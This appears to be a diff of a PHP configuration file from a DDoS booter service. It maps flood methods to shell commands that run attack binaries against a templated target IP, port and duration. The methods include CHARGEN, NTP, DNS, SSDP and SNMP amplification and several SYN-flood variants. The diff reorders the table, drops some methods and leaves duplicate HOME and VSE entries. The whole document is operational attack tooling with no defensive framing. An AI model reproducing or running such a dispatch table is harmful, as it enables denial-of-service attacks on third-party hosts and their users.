@@ -36,24 +36,22 @@ $_TIMEMAX = 12001;
 
 
 $_METHOD["CHARGEN"] = "./chargen %ip% %port% chargen.txt 1 -1 %time%";
-$_METHOD["CSYN"] = "./csyn %ip% %port% 1 -1 %time%";
-$_METHOD["DNS"] = "./dns %ip% %port% dns.txt 1 %time%";
-$_METHOD["DOMINATE"] = "./dominate %ip% %port% 1 -1 %time%";
-$_METHOD["ESSYN"] = "./essyn %ip% %port% 1 -1 %time%";
-$_METHOD["HOME"] = "./home %ip% %port% 1 -1 %time%";
 $_METHOD["NTP"] = "./ntp %ip% %port% ntp.txt 1 -1 %time%";
-$_METHOD["SNMP"] = "./snmp %ip% %port% snmp.txt 1 -1 %time%";
-$_METHOD["SSDP"] = "./ssdp %ip% %port% ssdp.txt 1 -1 %time%";
+$_METHOD["HOME"] = "./home %ip% %port% 1 -1 %time%";
+$_METHOD["DNS"] = "./dns %ip% %port% dns.txt 1 %time%";
+$_METHOD["VSE"] = "./vse %ip% 1 -1 %time%";
+$_METHOD["CSYN"] = "./csyn %ip% %port% 1 -1 %time%";
 $_METHOD["SSYN"] = "./ssyn %ip% %port% 1 -1 %time%";
+$_METHOD["SSDP"] = "./ssdp %ip% %port% ssdp.txt 1 -1 %time%";
+$_METHOD["ESSYN"] = "./essyn %ip% %port% 1 -1 %time%";
+$_METHOD["DOMINATE"] = "./dominate %ip% %port% 1 -1 %time%";
+$_METHOD["HOME"] = "./home %ip% %port% 1 -1 %time%";
+$_METHOD["SNMP"] = "./snmp %ip% %port% snmp.txt 1 -1 %time%";
 $_METHOD["TCP"] = "./tcp %ip% %port% 1 -1 %time%";
 $_METHOD["TCP-SE"] = "./tcp-se %ip% %port% 1 -1 %time%";
 $_METHOD["TELNET"] = "./telnet %ip% 1 -1 %time%";
 $_METHOD["TS3"] = "./ts3 %ip% %port% ts3.txt 1 -1 %time%";
 $_METHOD["VSE"] = "./vse %ip% 1 -1 %time%";
-$_METHOD["XSYN"] = "./xsyn %ip% %port% 1 -1 %time%";
-$_METHOD["XTS3"] = "./xts3 %ip% %port% 1 %time%";
-$_METHOD["ZAP"] = "./zap %ip% %port% 1 -1 %time%";
-$_METHOD["ZSYN"] = "./zsyn %ip% %port% 1 -1 %time%";
 
 
 
